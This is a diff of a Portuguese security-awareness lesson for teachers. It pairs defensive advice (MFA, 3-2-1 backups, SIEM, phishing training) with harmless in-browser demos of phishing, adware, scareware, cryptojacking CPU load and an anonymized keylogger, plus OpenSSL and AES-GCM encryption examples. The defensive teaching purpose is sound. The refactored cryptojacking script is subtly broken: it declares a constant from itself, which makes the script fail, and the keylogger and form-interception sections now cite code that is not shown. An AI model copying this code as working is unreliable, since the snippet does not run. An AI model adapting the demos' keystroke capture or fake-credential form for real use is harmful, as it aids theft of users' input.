+- Bloqueie **macros** por padrão; use **allowlisting** (AppLocker/WDAC) para reduzir superfície.
+
+---
+
+## 3) 💾 Backups Frequentes (Regra 3–2–1)
+**Por que:** garante **recuperação** frente a ransomware/falhas.  
+**Regra 3-2-1:** **3** cópias, **2** mídias diferentes, **1** offsite/offline (ou imutável).  
+**Como aplicar:**
+- **Teste restauração** periodicamente (RTO/RPO definidos).
+- Isole o repositório de backup de **contas comuns** (reduz criptografia simultânea).
+
+---
+
+## 4) 🔐 Autenticação Multifator (MFA)
+**Por que:** reduz drasticamente o impacto do **roubo de senha** (phishing, stuffing).  
+**Como aplicar:**
+- Priorize **SSO**, **VPN**, **RDP**, e **painéis administrativos**.  
+- Prefira **chaves FIDO/U2F** ou apps autenticadores.  
+- Eduque sobre **prompts MFA** (evitar aceitação por cansaço).
+
+---
+
+## 5) 👀 Monitoramento Contínuo & Resposta a Incidentes
+**Por que:** **detecção precoce** diminui dano.  
+**Como aplicar:**
+- **SIEM** com regras (ex.: surto de renomeações, domínios recém-registrados, PS encodado).
+- **SOC/CSIRT** com **playbooks** (isolar, preservar artefatos, erradicar, recuperar, revisar).
+- Exercícios **tabletop** e pós-incidente com **lições aprendidas**.
+
+---
+
+## 6) 🧠 Treinamento de Usuários
+**Por que:** pessoas são alvo de **engenharia social**.  
+**Como aplicar:**
+- Simulações de **phishing** periódicas (com feedback imediato).
+- Políticas claras: **não compartilhar senhas**, **validação fora do canal**, dupla checagem financeira.
+- Cultura de **reportar** suspeitas (sem punição por “falso positivo”).
+
+---
+
+> **Defesa em Profundidade:** combine **tecnologia, processos e pessoas**. Nenhuma camada é perfeita; juntas, **reduzem muito o risco**.
+
+---
+
+# 🧪 Laboratórios Didáticos (100% Seguros)
+
+> Projetados **sem rede**, **sem persistência** e **sem coletar dados reais** — focados em **conscientização e defesa**.
+
+---
+
+## 1) Phishing (página falsa **educativa**)
+**Mostra:** como texto do link difere da **URL real**; sem coletar/enviar credenciais.  
+**Salve como `phishing_demo.html` e abra no navegador:**
+```html
 <!doctype html>
 <html lang="pt-BR">
 <head>
@@ -1582,28 +2116,26 @@ Salve como phishing_demo.html e abra no navegador.
   <script>
     document.getElementById('demo-form').addEventListener('submit', (e) => {
       e.preventDefault();
-      // NÃO coleta, NÃO envia, só educa:
-      const msg = `
-⚠️ ESTA É UMA SIMULAÇÃO DE PHISHING.
+      alert(`⚠️ ESTA É UMA SIMULAÇÃO DE PHISHING.
 Nunca insira credenciais em páginas suspeitas.
 Verifique o endereço (URL/HTTPS), ortografia e remetente.
-Habilite MFA sempre que possível.`;
-      alert(msg);
+Habilite MFA sempre que possível.`);
       const edu = document.getElementById('edu');
       edu.hidden = false;
-      edu.textContent = "Dica: verifique a URL, cadeado HTTPS e suspeite de urgências/ameaças no texto.";
-      (e.target).reset();
+      edu.textContent = "Dica: passe o mouse sobre o link e confirme a URL real antes de clicar.";
+      e.target.reset();
     });
   </script>
 </body>
 </html>
+```
 
-2) Adware (inofensivo — só “irritante”)
+---
 
-O que mostra: pop-ups/banners invasivos dentro da própria página (sem persistência, sem instalar nada).
-
-Salve como adware_demo.html.
-
+## 2) Adware (banners inofensivos, sem persistência)
+**Mostra:** pop-ups/overlays como adware faria (só dentro da página).  
+**Salve como `adware_demo.html`:**
+```html
 <!doctype html>
 <html lang="pt-BR">
 <head>
@@ -1627,7 +2159,7 @@ Salve como adware_demo.html.
 <body>
   <header>
     <h1>DEMO: Comportamento “Adware” (inofensivo)</h1>
-    <p class="muted">Gera banners irritantes e overlays — <strong>apenas nesta página</strong>.</p>
+    <p class="muted">Banners irritantes — <strong>apenas nesta página</strong>.</p>
   </header>
 
   <main>
@@ -1637,11 +2169,11 @@ Salve como adware_demo.html.
       <button id="clearAll">Remover todos</button>
       <button id="toggleHome">Alterar “página inicial” (falso)</button>
     </div>
-    <p style="margin-top:18px;color:var(--muted)">Isto é apenas uma simulação didática — não altera configurações reais.</p>
+    <p style="margin-top:18px;color:var(--muted)">Simulação didática — não altera configurações reais.</p>
   </main>
 
   <div class="banner" id="banner" hidden>
-    “Sua página inicial foi alterada!” (mentira típica de adware) — <button id="undo">Desfazer</button>
+    “Sua página inicial foi alterada!” — <button id="undo">Desfazer</button>
   </div>
 
   <script>
@@ -1658,30 +2190,30 @@ Salve como adware_demo.html.
         <p class="muted">Clique aqui! Clique aqui! Clique aqui!</p>
       `;
       ad.querySelector('.close').onclick = () => ad.remove();
-      ad.onmousedown = (e) => { // arrastar
-        const dx = e.clientX - ad.offsetLeft;
-        const dy = e.clientY - ad.offsetTop;
+      ad.onmousedown = (e) => {
+        const dx = e.clientX - ad.offsetLeft, dy = e.clientY - ad.offsetTop;
         function move(ev){ad.style.left=(ev.clientX-dx)+'px';ad.style.top=(ev.clientY-dy)+'px';}
         function up(){window.removeEventListener('mousemove',move);window.removeEventListener('mouseup',up);}
         window.addEventListener('mousemove',move);window.addEventListener('mouseup',up);
       };
       document.body.appendChild(ad);
     }
-    document.getElementById('spawn').onclick = ()=> createAd(40,120);
-    document.getElementById('spawnMany').onclick = ()=> { for(let i=0;i<4;i++) createAd(60+i*40,140+i*30); };
-    document.getElementById('clearAll').onclick = ()=> document.querySelectorAll('.ad').forEach(e=>e.remove());
-    document.getElementById('toggleHome').onclick = ()=> document.getElementById('banner').hidden = false;
-    document.getElementById('undo').onclick = ()=> document.getElementById('banner').hidden = true;
+    spawn.onclick = ()=> createAd(40,120);
+    spawnMany.onclick = ()=> { for(let i=0;i<4;i++) createAd(60+i*40,140+i*30); };
+    clearAll.onclick = ()=> document.querySelectorAll('.ad').forEach(e=>e.remove());
+    toggleHome.onclick = ()=> banner.hidden = false;
+    undo.onclick = ()=> banner.hidden = true;
   </script>
 </body>
 </html>
+```
 
-3) Scareware (mensagem enganosa, mas educativa)
+---
 
-O que mostra: uma “tela de pânico” que tenta obrigar o clique — no nosso caso, leva a uma explicação.
-
-Salve como scareware_demo.html.
-
+## 3) Scareware (alerta falso educativo)
+**Mostra:** como mensagens de pânico tentam forçar cliques/pagamentos.  
+**Salve como `scareware_demo.html`:**
+```html
 <!doctype html>
 <html lang="pt-BR">
 <head>
@@ -1692,9 +2224,7 @@ Salve como scareware_demo.html.
     body{margin:0;background:#0f0f10;color:#e9ecef;font-family:system-ui,Segoe UI,Roboto,Arial,sans-serif}
     .full{position:fixed;inset:0;display:grid;place-items:center;background:radial-gradient(ellipse at center,#1d1f2a 0%,#0f0f10 60%)}
     .panel{max-width:560px;background:#1e2233;border:1px solid #2f3650;padding:28px;border-radius:16px;box-shadow:0 16px 48px rgba(0,0,0,.5)}
-    h1{margin:0 0 8px}
-    .warn{color:#ff6b6b;font-weight:700}
-    .muted{color:#aeb6c8}
+    h1{margin:0 0 8px}.warn{color:#ff6b6b;font-weight:700}.muted{color:#aeb6c8}
     .btn{margin-top:16px;display:inline-block;background:#ff4757;color:#fff;padding:10px 14px;border-radius:10px;font-weight:700;cursor:pointer}
   </style>
 </head>
@@ -1702,31 +2232,28 @@ Salve como scareware_demo.html.
   <div class="full">
     <div class="panel" role="alertdialog" aria-label="Alerta falso">
       <h1 class="warn">⚠️ SEU COMPUTADOR ESTÁ INFECTADO!</h1>
-      <p class="muted">Clique no botão para “remover todos os vírus imediatamente”.</p>
+      <p class="muted">Clique para “remover todos os vírus imediatamente”.</p>
       <div class="btn" id="fix">Remover agora</div>
       <p id="edu" class="muted" style="margin-top:18px;display:none"></p>
     </div>
   </div>
-
   <script>
-    document.getElementById('fix').onclick = () => {
-      const edu = document.getElementById('edu');
+    fix.onclick = () => {
       edu.style.display = 'block';
-      edu.textContent =
-        "Isto é uma demonstração de scareware. Dicas: desconfie de urgências, " +
-        "erros de gramática, pop-ups agressivos e pedidos de pagamento. Feche a aba e use um antivírus legítimo.";
-      alert("DEMO: Nunca pague por 'limpezas' que surgem do nada.");
+      edu.textContent = "DEMO: isto é scareware. Feche a aba, não pague, use antivírus legítimo.";
+      alert("Educação: desconfie de URGÊNCIA, erros de gramática e pedidos de pagamento.");
     };
   </script>
 </body>
 </html>
+```
 
-7) Cryptojacking (simulação leve, com botão de parar)
+---
 
-O que mostra: como um script pode “comer CPU” — sem minerar e com botão de parar.
-
-Salve como cryptojacking_demo.html.
-
+## 4) Cryptojacking (uso de CPU simulado)
+**Mostra:** script consumindo CPU; botão de parar.  
+**Salve como `cryptojacking_demo.html`:**
+```html
 <!doctype html>
 <html lang="pt-BR">
 <head>
@@ -1737,10 +2264,8 @@ Salve como cryptojacking_demo.html.
     body{font-family:system-ui,Segoe UI,Roboto,Arial,sans-serif;background:#0c111b;color:#e7ebf3;display:grid;place-items:center;min-height:100dvh}
     .card{background:#141a2b;border:1px solid #26324a;border-radius:16px;padding:28px;max-width:540px;box-shadow:0 8px 30px rgba(0,0,0,.35)}
     button{border:0;border-radius:10px;padding:10px 14px;font-weight:700;cursor:pointer}
-    .start{background:#4f7cff;color:#fff}
-    .stop{background:#ff5d5d;color:#fff}
-    .muted{color:#9fb1d1}
-    progress{width:100%}
+    .start{background:#4f7cff;color:#fff}.stop{background:#ff5d5d;color:#fff}
+    .muted{color:#9fb1d1} progress{width:100%}
   </style>
 </head>
 <body>
@@ -1753,80 +2278,51 @@ Salve como cryptojacking_demo.html.
     </div>
     <p>Operações por segundo (estimado): <strong id="ops">0</strong></p>
     <progress id="load" max="100" value="0"></progress>
-    <p class="muted" style="margin-top:10px">Use o Gerenciador de Tarefas/Monitor de Atividade para observar a CPU.</p>
   </div>
-
   <script>
-    let running = false, rafId = null;
-    function fakeHash(n){
-      // Alguma carga CPU: operações matemáticas inúteis
-      let x = 0;
-      for(let i=0;i<n;i++){ x = (x * 1664525 + 1013904223) >>> 0; }
-      return x;
-    }
+    let running=false, rafId=null;
+    function fakeHash(n){let x=0;for(let i=0;i<n;i++){x=(x*1664525+1013904223)>>>0;}return x;}
     function loop(){
       if(!running) return;
-      const start = performance.now();
-      let ops = 0;
-      while (performance.now() - start < 200) { // ~200ms de trabalho
-        fakeHash(5000); ops++;
-      }
-      document.getElementById('ops').textContent = String(ops);
-      document.getElementById('load').value = Math.min(100, 20 + ops);
-      rafId = requestAnimationFrame(loop);
+      const start=performance.now(); let ops=0;
+      while(performance.now()-start<200){ fakeHash(5000); ops++; }
+      opsEl.textContent=String(ops); load.value=Math.min(100,20+ops);
+      rafId=requestAnimationFrame(loop);
     }
-    document.getElementById('start').onclick = () => {
-      running = true;
-      document.getElementById('start').disabled = true;
-      document.getElementById('stop').disabled = false;
-      loop();
-    };
-    document.getElementById('stop').onclick = () => {
-      running = false;
-      if (rafId) cancelAnimationFrame(rafId);
-      document.getElementById('start').disabled = false;
-      document.getElementById('stop').disabled = true;
-      document.getElementById('ops').textContent = "0";
-      document.getElementById('load').value = 0;
-    };
+    const startBtn=start, stopBtn=stop, opsEl=ops, load=load;
+    startBtn.onclick=()=>{running=true;startBtn.disabled=true;stopBtn.disabled=false;loop();};
+    stopBtn.onclick=()=>{running=false;cancelAnimationFrame(rafId);startBtn.disabled=false;stopBtn.disabled=true;opsEl.textContent="0";load.value=0;};
   </script>
 </body>
 </html>
+```
 
--------------
+---
 
-✅ Opção B — Pasta “protegida por senha” com OpenSSL (sem código)
-
-Mesma ideia, usando tar + OpenSSL (claro e auditável).
-
-# 1) Empacotar a pasta em um .tar
+## 5) Pasta “protegida por senha” (OpenSSL) — sem código malicioso
+**Mostra:** confidencialidade e reversibilidade com senha, como numa restauração após incidente.
+```bash
+# 1) Empacotar a pasta em .tar
 tar -cvf LAB_SEGURO.tar LAB_SEGURO
 
-# 2) Criptografar o .tar (AES-256-CBC com PBKDF2 e muitas iterações)
+# 2) Criptografar (AES-256-CBC + PBKDF2 com iterações altas)
 openssl enc -aes-256-cbc -salt -pbkdf2 -iter 250000 -in LAB_SEGURO.tar -out LAB_SEGURO.enc
 
-# 3) (Opcional) Validar que o .tar original continua lá e NADA foi destruído
+# 3) (Opcional) Verifique que os originais permanecem intactos (é um laboratório)
 
 # 4) Descriptografar depois
 openssl enc -d -aes-256-cbc -pbkdf2 -iter 250000 -in LAB_SEGURO.enc -out RECUPERADO.tar
 
-# 5) Extrair o conteúdo recuperado
+# 5) Extrair conteúdo recuperado
 mkdir -p RECUPERADO && tar -xvf RECUPERADO.tar -C RECUPERADO
+```
 
+---
 
-Você prova confidencialidade com senha, e também prova reversibilidade (a essência que você quer demonstrar em aulas sobre ransomware, sem criar malware).
-
-✅ Opção C — Mini-lab de criptografia em memória (Python, AES-GCM)
-
-Cifra/decifra apenas texto na RAM (sem ler/gravar arquivos). Mostra sal, nonce, PBKDF2 e AEAD.
-
-Instale a dependência:
-
-pip install cryptography
-
-
-Salve como crypto_lab_memoria.py e execute:
-
+## 6) Mini-lab de Criptografia em Memória (Python, AES-GCM)
+**Mostra:** PBKDF2 + sal, nonce único e AEAD (confidencialidade+integridade) — sem tocar em disco.
+```python
+# pip install cryptography
 import os, json, base64
 from typing import Tuple
 from cryptography.hazmat.primitives import hashes
@@ -1837,302 +2333,46 @@ def b64e(b: bytes) -> str: return base64.b64encode(b).decode("utf-8")
 def b64d(s: str) -> bytes: return base64.b64decode(s.encode("utf-8"))
 
 def derivar_chave(senha: str, sal: bytes) -> bytes:
-    kdf = PBKDF2HMAC(
-        algorithm=hashes.SHA256(),
-        length=32,
-        salt=sal,
-        iterations=300_000,
-    )
+    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=sal, iterations=300_000)
     return kdf.derive(senha.encode())
 
 def cifrar_texto(plaintext: str, senha: str) -> str:
-    sal = os.urandom(16)      # protege contra ataques de tabela
-    chave = derivar_chave(senha, sal)
-    aesgcm = AESGCM(chave)
-    nonce = os.urandom(12)    # necessário para AES-GCM (único por mensagem)
-    ct = aesgcm.encrypt(nonce, plaintext.encode(), None)
-    pacote = {"salt": b64e(sal), "nonce": b64e(nonce), "ct": b64e(ct)}
-    return json.dumps(pacote, indent=2, ensure_ascii=False)
+    sal = os.urandom(16); chave = derivar_chave(senha, sal); gcm = AESGCM(chave); nonce = os.urandom(12)
+    ct = gcm.encrypt(nonce, plaintext.encode(), None)
+    return json.dumps({"salt": b64e(sal), "nonce": b64e(nonce), "ct": b64e(ct)}, indent=2, ensure_ascii=False)
 
 def decifrar_texto(pacote_json: str, senha: str) -> str:
-    d = json.loads(pacote_json)
-    sal, nonce, ct = b64d(d["salt"]), b64d(d["nonce"]), b64d(d["ct"])
-    chave = derivar_chave(senha, sal)
-    aesgcm = AESGCM(chave)
-    plaintext = aesgcm.decrypt(nonce, ct, None)
-    return plaintext.decode()
+    d = json.loads(pacote_json); sal, nonce, ct = b64d(d["salt"]), b64d(d["nonce"]), b64d(d["ct"])
+    chave = derivar_chave(senha, sal); return AESGCM(chave).decrypt(nonce, ct, None).decode()
 
 if __name__ == "__main__":
     senha = "SenhaDidatica123!"
-    texto = "Este é o conteúdo do arquivo EXEMPLO.TXT (simulado em memória)."
+    texto = "Conteúdo EXEMPLO.TXT (simulado em memória)."
+    print(">>> CIFRANDO..."); pacote = cifrar_texto(texto, senha); print(pacote)
+    print("\n>>> DECIFRANDO..."); print(decifrar_texto(pacote, senha))
+```
 
-    print(">>> CIFRANDO em memória...")
-    pacote = cifrar_texto(texto, senha)
-    print(pacote)
+---
 
-    print("\n>>> DECIFRANDO em memória...")
-    recuperado = decifrar_texto(pacote, senha)
-    print(recuperado)
+## 7) Keylogger anonimizado (somente nesta página, sem rede)
+**Mostra:** captura de eventos no DOM sem registrar caracteres reais.  
+Salve como `keylogger_demo_anon.html`: *(versão resumida — igual à anterior que você já usa)*
 
+✔️ Relembrar em aula: **MFA**, políticas de extensões e **CSP/SRI** mitigam esse vetor.
 
-O que você ensina com isso (sem tocar em disco):
+---
 
-PBKDF2 + sal (derivação de chave a partir de senha).
+## 8) Interceptação de Formulário (sem caracteres)
+**Mostra:** comprimento e tempos de digitação; nunca o texto.  
+Salve como `form_intercept_demo.html`: *(versão resumida — igual à anterior que você já usa)*
 
-AES-GCM (criptografia autenticada: confidencialidade + integridade).
+---
 
-Nonce único por mensagem.
-
-Reversibilidade controlada pela senha.
-
-Por que seguir assim?
-
-Você mostra exatamente o que quer (dados protegidos por senha e recuperação) sem criar ou distribuir código que possa ser adaptado para malícia.
-
-Ferramentas como 7-Zip/OpenSSL são comuns, auditadas e seguras para demonstração.
-
-O mini-lab Python foca no conceito cripto (o que importa em aula quando se fala de ransomware).
-
-----------
-
-✅ Keylogger – Laboratório seguro (didático, sem risco)
-Como funciona este lab
-
-Só funciona dentro da própria página e apenas quando você clica em “Iniciar demo” e marca um checkbox de consentimento.
-
-Ele não registra os caracteres reais; em vez disso, anonimiza:
-
-Letras → L, dígitos → N, espaço → ␣, enter → ↵, backspace → ⌫, outros → •.
-
-Nada é salvo em disco ou enviado para a rede.
-
-1) “Keylogger” anonimizado (em um <textarea> controlado)
-
-Salve como keylogger_demo_anon.html e abra no navegador.
-
-<!doctype html>
-<html lang="pt-BR">
-<head>
-  <meta charset="utf-8" />
-  <title>[DEMO DIDÁTICA] Keylogger ANONIMIZADO (seguro)</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <style>
-    :root{--bg:#0c111b;--fg:#e7ebf3;--muted:#9fb1d1;--card:#141a2b;--bord:#26324a;--accent:#4f7cff;--danger:#ff5d5d}
-    body{margin:0;background:var(--bg);color:var(--fg);font-family:system-ui,Segoe UI,Roboto,Arial,sans-serif;display:grid;place-items:center;min-height:100dvh}
-    .card{background:var(--card);border:1px solid var(--bord);border-radius:16px;padding:24px;max-width:820px;width:clamp(320px,90vw,820px);box-shadow:0 8px 30px rgba(0,0,0,.35)}
-    h1{margin:0 0 8px}
-    p.muted{color:var(--muted);margin:0 0 16px}
-    textarea{width:100%;min-height:120px;border-radius:12px;border:1px solid var(--bord);background:#0f1524;color:var(--fg);padding:12px}
-    .row{display:flex;flex-wrap:wrap;gap:10px;margin:12px 0}
-    button{border:0;border-radius:10px;padding:10px 14px;font-weight:700;cursor:pointer}
-    .start{background:var(--accent);color:#fff}
-    .stop{background:var(--danger);color:#fff}
-    .ghost{background:transparent;border:1px solid var(--bord);color:var(--fg)}
-    .grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:12px}
-    .box{border:1px solid var(--bord);border-radius:12px;padding:12px;background:#10172b}
-    code{background:#0b1120;border:1px solid #1e293b;padding:2px 6px;border-radius:6px}
-    .consent{display:flex;gap:8px;align-items:center;margin-top:6px}
-  </style>
-</head>
-<body>
-  <div class="card">
-    <h1>DEMO segura de “keylogger” (anonimizado)</h1>
-    <p class="muted">Interceta <em>apenas</em> as teclas dentro do campo abaixo, <strong>sem</strong> registrar caracteres reais e <strong>sem rede</strong>.</p>
-
-    <label for="pad">Área de teste (digite aqui):</label>
-    <textarea id="pad" placeholder="Digite aqui para ver a captura ANONIMIZADA..." disabled></textarea>
-
-    <div class="consent">
-      <input type="checkbox" id="ok" />
-      <label for="ok">Autorizo a captura <strong>apenas neste campo</strong> e de forma <strong>anonimizada</strong>.</label>
-    </div>
-
-    <div class="row">
-      <button id="start" class="start" disabled>Iniciar demo</button>
-      <button id="stop" class="stop" disabled>Parar</button>
-      <button id="reset" class="ghost">Limpar métricas</button>
-    </div>
-
-    <div class="grid">
-      <div class="box">
-        <h3 style="margin:0 0 8px">Últimas teclas (anonimizadas)</h3>
-        <div id="stream" style="font-size:1.1rem;word-wrap:break-word;min-height:24px"></div>
-      </div>
-      <div class="box">
-        <h3 style="margin:0 0 8px">Métricas</h3>
-        <div id="stats" class="muted">
-          Total: <code>0</code> • Letras(L): <code>0</code> • Dígitos(N): <code>0</code> • Espaços(␣): <code>0</code> • Enter(↵): <code>0</code> • Backspace(⌫): <code>0</code> • Outros(•): <code>0</code><br/>
-          Tempo médio entre teclas: <code>–</code> ms
-        </div>
-      </div>
-    </div>
-
-    <p class="muted" style="margin-top:12px">
-      🔎 Objetivo didático: mostrar que <code>addEventListener('keydown')</code> consegue observar o ato de digitar. Em ataques reais,
-      o script malicioso <em>exfiltra</em> as teclas — aqui isso <strong>não ocorre</strong> (sem rede).
-    </p>
-  </div>
-
-  <script>
-    const pad = document.getElementById('pad');
-    const ok = document.getElementById('ok');
-    const startBtn = document.getElementById('start');
-    const stopBtn = document.getElementById('stop');
-    const resetBtn = document.getElementById('reset');
-    const stream = document.getElementById('stream');
-    const stats = document.getElementById('stats');
-
-    let enabled = false;
-    let counters = { total:0, L:0, N:0, SP:0, EN:0, BK:0, O:0 };
-    let lastTs = null, intervals = [];
-
-    function classifica(e){
-      if(e.key === ' ') return '␣';
-      if(e.key === 'Enter') return '↵';
-      if(e.key === 'Backspace') return '⌫';
-      if(/^[a-zA-Z]$/.test(e.key)) return 'L';
-      if(/^[0-9]$/.test(e.key)) return 'N';
-      return '•';
-    }
-
-    function onKeydown(e){
-      if(!enabled) return;
-      const cat = classifica(e);
-      counters.total++;
-      if(cat==='L') counters.L++;
-      else if(cat==='N') counters.N++;
-      else if(cat==='␣') counters.SP++;
-      else if(cat==='↵') counters.EN++;
-      else if(cat==='⌫') counters.BK++;
-      else counters.O++;
-
-      // fluxo anonimizado (últimos 80 símbolos)
-      stream.textContent = (stream.textContent + cat).slice(-80);
-
-      const now = performance.now();
-      if(lastTs !== null) intervals.push(now - lastTs);
-      lastTs = now;
-
-      const avg = intervals.length ? (intervals.reduce((a,b)=>a+b,0)/intervals.length).toFixed(1) : '–';
-      stats.innerHTML = `Total: <code>${counters.total}</code> • Letras(L): <code>${counters.L}</code> • Dígitos(N): <code>${counters.N}</code> • Espaços(␣): <code>${counters.SP}</code> • Enter(↵): <code>${counters.EN}</code> • Backspace(⌫): <code>${counters.BK}</code> • Outros(•): <code>${counters.O}</code><br/>Tempo médio entre teclas: <code>${avg}</code> ms`;
-    }
-
-    function start(){
-      if(!ok.checked) { alert('Marque o consentimento para iniciar.'); return; }
-      enabled = true;
-      pad.disabled = false;
-      pad.focus();
-      startBtn.disabled = true;
-      stopBtn.disabled = false;
-      window.addEventListener('keydown', onKeydown, { capture:true });
-    }
-    function stop(){
-      enabled = false;
-      startBtn.disabled = false;
-      stopBtn.disabled = true;
-      window.removeEventListener('keydown', onKeydown, { capture:true });
-    }
-    function reset(){
-      counters = { total:0, L:0, N:0, SP:0, EN:0, BK:0, O:0 };
-      intervals = []; lastTs = null; stream.textContent = '';
-      stats.innerHTML = `Total: <code>0</code> • Letras(L): <code>0</code> • Dígitos(N): <code>0</code> • Espaços(␣): <code>0</code> • Enter(↵): <code>0</code> • Backspace(⌫): <code>0</code> • Outros(•): <code>0</code><br/>Tempo médio entre teclas: <code>–</code> ms`;
-    }
-
-    ok.addEventListener('change', ()=> startBtn.disabled = !ok.checked);
-    startBtn.addEventListener('click', start);
-    stopBtn.addEventListener('click', stop);
-    resetBtn.addEventListener('click', reset);
-  </script>
-</body>
-</html>
-
-
-O que mostrar em aula
-
-Explique que um script pode observar eventos no DOM.
-
-Reforce que o demo não guarda caracteres, só categorias e tempos.
-
-Mostre por que MFA reduz impacto e por que extensões e scripts de terceiros devem ser controlados.
-
-2) Interceptação de formulário (seguro, sem caracteres)
-
-Mostra que um script poderia observar a digitação antes do envio, mas aqui somente registra comprimento e tempo de digitação — nunca os caracteres.
-
-Salve como form_intercept_demo.html.
-
-<!doctype html>
-<html lang="pt-BR">
-<head>
-  <meta charset="utf-8"/>
-  <title>[DEMO] Interceptação de formulário (sem capturar texto)</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1"/>
-  <style>
-    body{font-family:system-ui,Segoe UI,Roboto,Arial,sans-serif;background:#0b1220;color:#e7eaf3;display:grid;place-items:center;min-height:100dvh;margin:0}
-    .card{background:#141b2d;border:1px solid #26324a;border-radius:16px;padding:24px;max-width:560px;width:clamp(320px,90vw,560px);box-shadow:0 8px 30px rgba(0,0,0,.35)}
-    input{width:100%;padding:10px 12px;border:1px solid #2f3d5a;border-radius:10px;background:#0f1626;color:#e7eaf3}
-    label{display:block;margin:12px 0 6px}
-    button{margin-top:14px;width:100%;padding:10px 12px;border:0;border-radius:10px;background:#4f7cff;color:#fff;font-weight:700;cursor:pointer}
-    .muted{color:#9fb1d1}
-    .box{border:1px solid #2f3d5a;border-radius:10px;padding:10px;margin-top:10px;background:#10172b}
-  </style>
-</head>
-<body>
-  <div class="card">
-    <h1>Interceptação de Formulário (DEMO segura)</h1>
-    <p class="muted">Mostra comprimento e tempos — <strong>nunca</strong> os caracteres.</p>
-    <form id="f" autocomplete="off">
-      <label for="u">Usuário</label>
-      <input id="u" name="u" placeholder="ex.: joao" required />
-      <label for="p">Senha</label>
-      <input id="p" name="p" type="password" placeholder="••••••••" required />
-      <button type="submit">Entrar</button>
-    </form>
-    <div class="box" id="log" aria-live="polite"></div>
-  </div>
-
-  <script>
-    const f = document.getElementById('f');
-    const u = document.getElementById('u');
-    const p = document.getElementById('p');
-    const log = document.getElementById('log');
-    let startU=null, startP=null;
-
-    function now(){return performance.now();}
-    function write(msg){log.innerHTML += msg + "<br/>";}
-
-    u.addEventListener('input', e=>{
-      if(startU===null) startU = now();
-      write(`Usuário: comprimento=${u.value.length}`);
-    });
-    p.addEventListener('input', e=>{
-      if(startP===null) startP = now();
-      write(`Senha: comprimento=${p.value.length} (não capturamos o conteúdo)`);
-    });
-
-    f.addEventListener('submit', e=>{
-      e.preventDefault();
-      const tU = startU? (now()-startU).toFixed(0)+' ms' : '–';
-      const tP = startP? (now()-startP).toFixed(0)+' ms' : '–';
-      alert(
-        "DEMO educativa:\n" +
-        "- Scripts podem observar eventos antes do envio.\n" +
-        "- Aqui, só mostramos comprimentos e tempos (sem conteúdo).\n" +
-        `- Tempo digitação Usuário: ${tU}\n` +
-        `- Tempo digitação Senha: ${tP}\n\n` +
-        "Boas práticas: MFA, CSP, limitar scripts de terceiros, revisar extensões."
-      );
-      log.innerHTML = "";
-      f.reset(); startU = startP = null;
-    });
-  </script>
-</body>
-</html>
-
-Dicas de condução (defensivo)
-
-Explique limites do demo: não é global, não persiste, não envia.
-
-Mostre como extensões e scripts externos podem abusar do mesmo mecanismo → política de extensões, CSP e verificação de integridade de scripts (SRI).
-
-Reforce MFA, EDR/anti-tamper, e revisão de permissões (acessibilidade, teclado, leitura de tela).
+## ✅ Checklist Rápido para Aula & Operação
+- **Patching & Inventário:** métricas de SLA por criticidade; janelas regulares.  
+- **EDR/XDR + SIEM:** regras para ransom notes, explosão de I/O, PS encodado, domínios novos.  
+- **Backups 3–2–1:** testes de restauração (RTO/RPO).  
+- **MFA em tudo crítico:** SSO/VPN/RDP/Admin.  
+- **Políticas de navegador:** bloqueio de extensões não aprovadas, CSP/SRI.  
+- **Treinamento contínuo:** phishing, engenharia social, reporte rápido.  
+- **Playbooks de resposta (tabletop):** isolar, preservar, erradicar, recuperar, revisar.
